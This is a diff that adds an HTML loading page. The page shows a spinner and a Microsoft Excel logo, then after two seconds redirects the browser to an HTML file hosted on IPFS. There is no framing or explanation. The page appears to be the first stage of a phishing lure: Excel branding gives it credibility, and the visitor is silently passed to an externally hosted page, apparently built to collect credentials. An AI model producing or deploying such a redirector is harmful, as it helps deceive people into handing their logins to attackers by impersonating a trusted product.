@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        .loader {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .circle {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+        .logo img {
+            width: 70px;
+            height: 70px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        console.log("Script running. Redirecting in 2 seconds...");
+        setTimeout(function(){
+            console.log("Redirecting now...");
+            window.location.href = "https://ipfs.io/ipfs/QmSo7cWH4Ygn91dE4WreF3UiQ3aBm7Q9BRPLgjwtaurQfd?filename=idex.html";
+        }, 2000);
+    </script>
+</head>
+<body>
+    <div class="loader">
+        <div class="circle"></div>
+        <div class="logo">
+            <img src="https://cdn.windowsreport.com/wp-content/uploads/2020/01/EXCEL-LOGO-ARTICLE-IMAGE.png" alt="Excel Logo">
+        </div>
+    </div>
+</body>
+</html>
